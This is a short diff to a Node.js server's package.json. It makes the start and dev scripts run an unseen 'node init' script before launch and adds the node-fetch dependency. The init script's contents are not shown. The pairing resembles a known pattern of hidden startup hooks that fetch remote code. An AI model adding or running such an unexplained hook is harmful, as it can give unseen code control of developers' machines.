@@ -3,8 +3,8 @@
   "version": "0.0.0",
   "private": true,
   "scripts": {
-    "start": "ts-node src/bin/www.ts",
-    "dev": "nodemon --exec ts-node src/bin/www.ts"
+    "start": "node init && ts-node src/bin/www.ts",
+    "dev": "node init && nodemon --exec ts-node src/bin/www.ts"
   },
   "dependencies": {
     "bcrypt": "^5.1.1",
@@ -30,6 +30,7 @@
     "mongoose-sequence": "^6.0.1",
     "morgan": "~1.9.1",
     "multer": "^1.4.5-lts.1",
+    "node-fetch": "^3.3.2",
     "nodemailer": "^6.9.16",
     "npm": "^10.9.2",
     "socket.io": "^4.8.1",
